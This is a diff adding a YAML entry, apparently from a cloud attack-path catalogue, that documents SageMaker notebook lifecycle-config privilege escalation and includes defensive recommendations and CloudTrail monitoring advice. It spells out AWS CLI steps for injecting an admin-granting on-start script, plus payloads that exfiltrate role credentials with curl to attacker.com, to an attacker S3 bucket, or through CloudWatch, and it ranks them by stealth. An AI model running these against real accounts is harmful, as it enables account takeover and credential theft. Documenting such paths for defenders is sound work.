@@ -1,0 +1,463 @@
+id: sagemaker-005
+name: sagemaker:CreateNotebookInstanceLifecycleConfig + sagemaker:StopNotebookInstance + sagemaker:UpdateNotebookInstance + sagemaker:StartNotebookInstance
+category: access-resource
+services:
+  - sagemaker
+  - iam
+
+permissions:
+  required:
+    - permission: sagemaker:CreateNotebookInstanceLifecycleConfig
+      resourceConstraints: Can create lifecycle configurations with any name
+    - permission: sagemaker:StopNotebookInstance
+      resourceConstraints: Must have access to stop the target notebook instance
+    - permission: sagemaker:UpdateNotebookInstance
+      resourceConstraints: Must have access to update the target notebook instance
+    - permission: sagemaker:StartNotebookInstance
+      resourceConstraints: Must have access to start the target notebook instance
+  additional:
+    - permission: sagemaker:DescribeNotebookInstance
+      resourceConstraints: Helpful for viewing notebook details, status, and attached execution role
+    - permission: sagemaker:ListNotebookInstances
+      resourceConstraints: Useful for discovering available notebook instances to target
+    - permission: iam:GetRole
+      resourceConstraints: Helpful for verifying the notebook's execution role has elevated permissions
+
+description: A principal with SageMaker notebook management permissions can inject malicious code into an existing notebook instance by creating a malicious lifecycle configuration and attaching it to the notebook. Lifecycle configurations are shell scripts that execute automatically when a notebook starts, and critically, these scripts run with the notebook's execution role credentials rather than the attacker's credentials. By stopping the notebook, attaching a malicious lifecycle config, and restarting it, the attacker can execute arbitrary code with the notebook's execution role permissions. If the notebook has an execution role with administrative access (a common practice for data science workflows), the attacker gains full administrative access to the AWS account.
+
+prerequisites:
+  admin:
+    - A SageMaker notebook instance must exist in the account
+    - The notebook must have an execution role with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+  lateral:
+    - A SageMaker notebook instance must exist in the account
+    - The notebook must have an execution role with some elevated permissions
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        aws sagemaker list-notebook-instances
+      description: Discover available SageMaker notebook instances in the account
+    - step: 2
+      command: |
+        aws sagemaker describe-notebook-instance \
+          --notebook-instance-name TARGET_NOTEBOOK_NAME
+      description: Get details about the target notebook including its execution role ARN and current status
+    - step: 3
+      command: |
+        aws iam get-role --role-name NOTEBOOK_EXECUTION_ROLE_NAME
+        aws iam list-attached-role-policies --role-name NOTEBOOK_EXECUTION_ROLE_NAME
+      description: Verify the notebook's execution role has the desired elevated permissions
+    - step: 4
+      command: |
+        aws sagemaker stop-notebook-instance \
+          --notebook-instance-name TARGET_NOTEBOOK_NAME
+      description: Stop the notebook instance (lifecycle configurations can only be modified when the notebook is stopped). Wait for the notebook to reach 'Stopped' status before proceeding
+    - step: 5
+      command: |
+        # Create a base64-encoded malicious script
+        LIFECYCLE_SCRIPT='#!/bin/bash
+        set -e
+        # This script runs with the notebook execution role credentials
+        aws iam attach-user-policy \
+          --user-name YOUR_USERNAME \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        '
+        ENCODED_SCRIPT=$(echo "$LIFECYCLE_SCRIPT" | base64)
+
+        aws sagemaker create-notebook-instance-lifecycle-config \
+          --notebook-instance-lifecycle-config-name malicious-lifecycle-config \
+          --on-start Content="$ENCODED_SCRIPT"
+      description: Create a malicious lifecycle configuration with a script that will grant you administrative access. The script must be base64-encoded
+    - step: 6
+      command: |
+        aws sagemaker update-notebook-instance \
+          --notebook-instance-name TARGET_NOTEBOOK_NAME \
+          --lifecycle-config-name malicious-lifecycle-config
+      description: Attach the malicious lifecycle configuration to the target notebook. Wait for the update to complete (notebook returns to 'Stopped' status)
+    - step: 7
+      command: |
+        aws sagemaker start-notebook-instance \
+          --notebook-instance-name TARGET_NOTEBOOK_NAME
+      description: Start the notebook instance. The malicious lifecycle script will execute automatically during startup with the notebook's execution role credentials. Wait for the notebook to reach 'InService' status (5-8 minutes)
+    - step: 8
+      command: |
+        # Wait 15-30 seconds for IAM policy changes to propagate
+        sleep 15
+
+        aws iam list-users --max-items 3
+      description: Verify you now have administrative access by attempting admin-level actions like listing IAM users
+
+recommendation: |
+  High powered notebook execution roles + overly permissive SageMaker management permissions is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative notebook execution roles** - Very rarely does a SageMaker notebook need administrative access. Use the principle of least privilege and scope execution roles to only the specific S3 buckets, data sources, and AWS services required for data science workloads.
+  - **Restrict SageMaker management permissions** - Limit `sagemaker:UpdateNotebookInstance` and `sagemaker:CreateNotebookInstanceLifecycleConfig` permissions to infrastructure administrators only, not data science users. Separate notebook usage permissions from notebook configuration permissions.
+  - **Implement resource-based conditions** - Use IAM condition keys to restrict lifecycle configuration changes:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "sagemaker:UpdateNotebookInstance",
+    "Resource": "*",
+    "Condition": {
+      "StringLike": {
+        "sagemaker:LifecycleConfigName": ["approved-config-*"]
+      }
+    }
+  }
+  ```
+
+  - **Require approval workflows** - Implement approval workflows for notebook configuration changes using AWS Service Catalog or custom automation
+  - Monitor CloudTrail for unusual notebook lifecycle configuration creation followed by immediate notebook updates
+  - Monitor CloudTrail for notebook configuration changes by principals who do not usually manage infrastructure
+  - Monitor CloudTrail for the specific API call sequence: `StopNotebookInstance` → `CreateNotebookInstanceLifecycleConfig` → `UpdateNotebookInstance` → `StartNotebookInstance` as this pattern indicates potential exploitation
+  - Monitor and alert on lifecycle configuration changes to notebook instances with privileged execution roles
+  - Regularly audit SageMaker notebook instances for excessive execution role permissions
+  - Regularly audit all IAM roles that trust the SageMaker service and down-scope any roles with administrative access
+  - Use Service Control Policies (SCPs) to prevent creation of SageMaker execution roles with administrative permissions
+
+limitations: |
+  This path provides administrative access only if the target notebook's execution role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.
+
+discoveredBy:
+  name: Daniel Grzelak
+  organization: Plerion
+  date: "2025"
+
+discoveryAttribution:
+  firstDocumented:
+    author: Daniel Grzelak
+    organization: Plerion
+    date: 2025
+    link: https://www.plerion.com/blog/privilege-escalation-with-sagemaker-and-execution-roles
+
+references:
+  - title: "Privilege Escalation with SageMaker and Execution Roles"
+    url: "https://www.plerion.com/blog/privilege-escalation-with-sagemaker-and-execution-roles"
+
+relatedPaths:
+  - sagemaker-001
+  - sagemaker-002
+  - sagemaker-003
+  - sagemaker-004
+
+learningEnvironments:
+  pathfinder-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinder-labs
+    scenario: "privesc-one-hop/to-admin/sagemaker-updatenotebook-lifecycle-config"
+    description: "Deploy Terraform into your own AWS account to practice this attack path"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: |
+        The starting principal (user or role) with SageMaker notebook management permissions. This principal can stop existing notebook instances, create lifecycle configurations, update notebooks to attach new lifecycle configs, and restart notebooks. The lifecycle configuration scripts execute automatically when the notebook starts, running with the notebook's execution role credentials rather than the attacker's credentials.
+
+    - id: target_notebook
+      label: Existing SageMaker Notebook Instance
+      type: resource
+      description: |
+        An existing SageMaker notebook instance in the account. The notebook must be stopped before its lifecycle configuration can be modified. The notebook has an execution role attached that provides AWS API access to the notebook environment. When the notebook starts, any attached lifecycle configuration scripts execute automatically with the notebook's execution role credentials.
+
+    - id: malicious_lifecycle_config
+      label: Malicious Lifecycle Configuration
+      type: payload
+      color: '#99ccff'
+      description: |
+        A lifecycle configuration created by the attacker containing a base64-encoded shell script. Lifecycle configurations are shell scripts that execute automatically when a SageMaker notebook starts. The script is configured to run "OnStart" (when the notebook instance starts) and critically runs with the notebook's execution role credentials, not the attacker's credentials.
+
+        Example creation command:
+        ```bash
+        # Create the malicious script
+        LIFECYCLE_SCRIPT='#!/bin/bash
+        set -e
+        # This script runs with the notebook execution role credentials
+        aws iam attach-user-policy \
+          --user-name YOUR_USERNAME \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        '
+        ENCODED_SCRIPT=$(echo "$LIFECYCLE_SCRIPT" | base64)
+
+        # Create the lifecycle config
+        aws sagemaker create-notebook-instance-lifecycle-config \
+          --notebook-instance-lifecycle-config-name malicious-lifecycle-config \
+          --on-start Content="$ENCODED_SCRIPT"
+        ```
+
+    - id: notebook_execution_role
+      label: Notebook Execution Role
+      type: principal
+      description: |
+        The IAM role attached to the SageMaker notebook instance as its execution role. This role's credentials are automatically available to code running in the notebook environment, including lifecycle configuration scripts. When the lifecycle script executes during notebook startup, it runs with this role's permissions, allowing the attacker to leverage the role's elevated permissions without directly assuming it.
+
+    - id: method_direct_elevation
+      label: "Method 1: Direct Elevation Script"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Configure the lifecycle script to directly modify IAM and elevate the starting principal's permissions. The script uses the notebook execution role's credentials to perform privileged IAM actions such as:
+        - Attach AdministratorAccess policy to starting principal: `aws iam attach-user-policy --user-name USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`
+        - Create new access keys for starting principal: `aws iam create-access-key --user-name USERNAME`
+        - Add starting principal to admin group: `aws iam add-user-to-group --user-name USERNAME --group-name Admins`
+
+        This is the most straightforward approach but requires the execution role to have IAM write permissions. The elevation happens automatically during notebook startup.
+
+    - id: method_credential_exfil
+      label: "Method 2: Credential Exfiltration Script"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Configure the lifecycle script to retrieve the notebook execution role's temporary credentials and exfiltrate them to an attacker-controlled webhook or remote server. This is a fire-and-forget approach that doesn't require maintaining a connection.
+
+        Example lifecycle script:
+        ```bash
+        #!/bin/bash
+        set -e
+        # Retrieve AWS credentials from environment (automatically available in notebook)
+        CREDS=$(aws sts get-caller-identity && env | grep AWS_)
+        curl -X POST https://attacker.com/exfil -d "$CREDS"
+        ```
+
+        The attacker receives the credentials remotely and can then configure them locally to authenticate as the notebook execution role. This approach works regardless of the execution role's specific permissions.
+
+    - id: method_s3_exfil
+      label: "Method 3: S3 Exfiltration Script"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Configure the lifecycle script to write the notebook execution role's credentials to an attacker-controlled S3 bucket. This approach is stealthier than webhook exfiltration as it stays within AWS infrastructure and doesn't require external network access.
+
+        Example lifecycle script:
+        ```bash
+        #!/bin/bash
+        set -e
+        # Get temporary credentials (automatically available in notebook environment)
+        aws sts get-caller-identity > /tmp/creds.txt
+        env | grep AWS_ >> /tmp/creds.txt
+        # Upload to attacker-controlled S3 bucket
+        aws s3 cp /tmp/creds.txt s3://attacker-bucket/exfil/$(date +%s)-creds.txt
+        ```
+
+        The attacker can then retrieve the credentials from S3 using their own AWS credentials. This method requires the execution role to have S3 write permissions but avoids external network traffic.
+
+    - id: method_cloudwatch_exfil
+      label: "Method 4: CloudWatch Logs Exfiltration"
+      type: payload
+      color: '#99ccff'
+      description: |
+        Configure the lifecycle script to write sensitive information to CloudWatch Logs where the attacker can retrieve it. SageMaker notebooks automatically send their logs to CloudWatch, making this a natural exfiltration channel.
+
+        Example lifecycle script:
+        ```bash
+        #!/bin/bash
+        set -e
+        # The notebook execution role credentials are already in the environment
+        echo "EXFIL_START"
+        aws sts get-caller-identity
+        env | grep AWS_
+        echo "EXFIL_END"
+        ```
+
+        The attacker can then retrieve the credentials from the notebook's CloudWatch log stream using `aws logs get-log-events`. This is the stealthiest approach as it uses legitimate logging infrastructure and requires no external resources. The attacker needs `logs:GetLogEvents` permission on the notebook's log group.
+
+    - id: admin_outcome
+      label: Effective Administrator
+      type: outcome
+      description: |
+        If the notebook execution role has AdministratorAccess or equivalent administrative permissions, the attacker gains full administrative access to the AWS account. Using any of the four exploitation methods, the attacker successfully leverages these permissions to either directly elevate their own principal or exfiltrate credentials that provide admin access from any location.
+
+    - id: partial_outcome
+      label: Check for Additional Access
+      type: outcome
+      color: '#ffeb99'
+      description: |
+        If the notebook execution role has some elevated permissions but not full admin access, the attacker gains partial privilege escalation. Using any of the four exploitation methods, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB access), security configuration changes, or additional privilege escalation paths. The attacker should enumerate the role's permissions to identify valuable actions.
+
+    - id: minimal_outcome
+      label: Minimal Additional Access
+      type: outcome
+      color: '#cccccc'
+      description: |
+        If the notebook execution role only has minimal permissions (like basic S3 read access for data science workflows or CloudWatch Logs write access), the privilege escalation provides limited value. Regardless of the exploitation method used, the exfiltrated credentials or direct actions will be constrained by the role's limited permission scope.
+
+  edges:
+    - from: start
+      to: target_notebook
+      label: sagemaker:StopNotebookInstance + sagemaker:CreateNotebookInstanceLifecycleConfig + sagemaker:UpdateNotebookInstance + sagemaker:StartNotebookInstance
+      description: |
+        Execute a multi-step process to inject a malicious lifecycle configuration into the target notebook:
+
+        Step 1 - Stop the notebook (lifecycle configs can only be modified when stopped):
+        ```bash
+        aws sagemaker stop-notebook-instance \
+          --notebook-instance-name TARGET_NOTEBOOK_NAME
+        ```
+        Wait for the notebook to reach 'Stopped' status.
+
+        Step 2 - Create the malicious lifecycle configuration:
+        ```bash
+        LIFECYCLE_SCRIPT='#!/bin/bash
+        set -e
+        # This script runs with the notebook execution role credentials
+        aws iam attach-user-policy \
+          --user-name YOUR_USERNAME \
+          --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        '
+        ENCODED_SCRIPT=$(echo "$LIFECYCLE_SCRIPT" | base64)
+
+        aws sagemaker create-notebook-instance-lifecycle-config \
+          --notebook-instance-lifecycle-config-name malicious-lifecycle-config \
+          --on-start Content="$ENCODED_SCRIPT"
+        ```
+
+        Step 3 - Attach the lifecycle config to the notebook:
+        ```bash
+        aws sagemaker update-notebook-instance \
+          --notebook-instance-name TARGET_NOTEBOOK_NAME \
+          --lifecycle-config-name malicious-lifecycle-config
+        ```
+
+        Step 4 - Start the notebook to trigger the malicious script:
+        ```bash
+        aws sagemaker start-notebook-instance \
+          --notebook-instance-name TARGET_NOTEBOOK_NAME
+        ```
+
+        The lifecycle script executes automatically during startup (5-8 minutes) with the notebook's execution role credentials.
+
+    - from: target_notebook
+      to: malicious_lifecycle_config
+      label: Lifecycle config attached to notebook
+      description: |
+        After the attacker updates the notebook configuration, the malicious lifecycle configuration is associated with the notebook instance. When the notebook starts, SageMaker automatically executes any OnStart scripts defined in the lifecycle configuration. The timing is critical - the script runs during the notebook initialization process, before the notebook becomes available for interactive use.
+
+    - from: malicious_lifecycle_config
+      to: notebook_execution_role
+      label: Script executes with notebook role credentials
+      description: |
+        When the notebook instance starts, the SageMaker service automatically executes the lifecycle configuration script. Critically, this script runs with the notebook's execution role credentials, not the attacker's credentials. The execution role's temporary credentials are automatically available in the script's environment via environment variables (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN), allowing the script to perform any AWS API actions permitted by the execution role.
+
+    - from: notebook_execution_role
+      to: method_direct_elevation
+      label: Option A
+      description: |
+        Choose the direct elevation approach: configure the lifecycle script to use the execution role's credentials to directly elevate the starting principal via IAM modifications. This is the most direct path to admin access but requires the execution role to have IAM write permissions.
+
+    - from: notebook_execution_role
+      to: method_credential_exfil
+      label: Option B
+      description: |
+        Choose the webhook exfiltration approach: configure the lifecycle script to send the execution role's credentials to an attacker-controlled external webhook or HTTP server. This approach works regardless of the execution role's specific permissions and doesn't require any additional AWS permissions beyond network access.
+
+    - from: notebook_execution_role
+      to: method_s3_exfil
+      label: Option C
+      description: |
+        Choose the S3 exfiltration approach: configure the lifecycle script to write credentials to an attacker-controlled S3 bucket. This stays within AWS infrastructure and is stealthier than external webhook exfiltration, but requires the execution role to have S3 write permissions.
+
+    - from: notebook_execution_role
+      to: method_cloudwatch_exfil
+      label: Option D
+      description: |
+        Choose the CloudWatch Logs approach: configure the lifecycle script to output credentials to stdout/stderr, which are automatically captured in CloudWatch Logs. This is the stealthiest approach as it uses legitimate logging infrastructure and doesn't require external resources or unusual S3 access patterns.
+
+    - from: method_direct_elevation
+      to: admin_outcome
+      label: If execution role has admin or IAM write permissions
+      branch: A1
+      condition: admin
+      description: |
+        If the notebook execution role has AdministratorAccess or permissions to modify IAM (like iam:AttachUserPolicy, iam:PutUserPolicy, iam:AddUserToGroup, iam:CreateAccessKey), the lifecycle script successfully elevates the starting principal to administrator during notebook startup. The elevation happens automatically without requiring the attacker to maintain any connections or poll for results.
+
+    - from: method_direct_elevation
+      to: partial_outcome
+      label: If execution role has some elevated permissions
+      branch: A2
+      condition: some_permissions
+      description: |
+        If the notebook execution role has some elevated permissions but not IAM write access, the lifecycle script can leverage those permissions for data access or other attacks, but cannot directly elevate the starting principal. The attacker may need to pursue additional privilege escalation paths or settle for data exfiltration.
+
+    - from: method_direct_elevation
+      to: minimal_outcome
+      label: If execution role has minimal permissions
+      branch: A3
+      condition: no_permissions
+      description: |
+        If the notebook execution role only has minimal permissions, the lifecycle script cannot effectively escalate privileges or perform useful actions. The direct elevation approach requires at least some elevated permissions to provide value.
+
+    - from: method_credential_exfil
+      to: admin_outcome
+      label: If execution role has admin permissions
+      branch: B1
+      condition: admin
+      description: |
+        If the notebook execution role has AdministratorAccess or equivalent administrative permissions, the exfiltrated credentials provide the attacker with full administrative access from any location. The attacker can configure the temporary credentials locally and perform any action in the account including creating persistent admin users, accessing all resources, and modifying security configurations.
+
+    - from: method_credential_exfil
+      to: partial_outcome
+      label: If execution role has some permissions
+      branch: B2
+      condition: some_permissions
+      description: |
+        If the notebook execution role has elevated but non-administrative permissions, the exfiltrated credentials provide partial privilege escalation. The attacker can use the credentials from their own environment to access S3 buckets, RDS databases, DynamoDB tables, or other resources accessible to the execution role.
+
+    - from: method_credential_exfil
+      to: minimal_outcome
+      label: If execution role has minimal permissions
+      branch: B3
+      condition: no_permissions
+      description: |
+        If the notebook execution role only has minimal permissions such as basic S3 read access for data science workflows, the exfiltrated credentials may not provide significant additional access beyond what the starting principal already had. However, the credentials could still be useful for reconnaissance.
+
+    - from: method_s3_exfil
+      to: admin_outcome
+      label: If execution role has admin permissions
+      branch: C1
+      condition: admin
+      description: |
+        If the notebook execution role has AdministratorAccess, the credentials exfiltrated to S3 provide full administrative access. The attacker retrieves the credentials from their S3 bucket and configures them locally to perform any action in the account. This approach is stealthier than webhook exfiltration as all traffic stays within AWS infrastructure.
+
+    - from: method_s3_exfil
+      to: partial_outcome
+      label: If execution role has some permissions
+      branch: C2
+      condition: some_permissions
+      description: |
+        If the notebook execution role has elevated but non-administrative permissions, the credentials in S3 can be retrieved and used for partial privilege escalation. The S3 exfiltration approach maintains a lower profile than external network connections while still providing the attacker with access to the execution role's permissions.
+
+    - from: method_s3_exfil
+      to: minimal_outcome
+      label: If execution role has minimal permissions
+      branch: C3
+      condition: no_permissions
+      description: |
+        If the notebook execution role only has minimal permissions, the credentials exfiltrated to S3 may not provide meaningful additional access. Additionally, if the execution role lacks S3 write permissions, this exfiltration method will fail entirely.
+
+    - from: method_cloudwatch_exfil
+      to: admin_outcome
+      label: If execution role has admin permissions
+      branch: D1
+      condition: admin
+      description: |
+        If the notebook execution role has AdministratorAccess, the credentials logged to CloudWatch provide full administrative access. The attacker retrieves the credentials from the notebook's CloudWatch log stream and configures them locally. This is the stealthiest approach as it uses only legitimate AWS logging infrastructure and requires no external resources or unusual S3 access.
+
+    - from: method_cloudwatch_exfil
+      to: partial_outcome
+      label: If execution role has some permissions
+      branch: D2
+      condition: some_permissions
+      description: |
+        If the notebook execution role has elevated but non-administrative permissions, the credentials in CloudWatch Logs can be retrieved and used for partial privilege escalation. This approach is particularly stealthy as logging is expected behavior for SageMaker notebooks, making the exfiltration difficult to detect.
+
+    - from: method_cloudwatch_exfil
+      to: minimal_outcome
+      label: If execution role has minimal permissions
+      branch: D3
+      condition: no_permissions
+      description: |
+        If the notebook execution role only has minimal permissions, the credentials logged to CloudWatch may not provide significant additional access. However, the CloudWatch approach is still valuable for reconnaissance as it's the stealthiest exfiltration method and can help the attacker understand what permissions are available for potential multi-hop attacks.
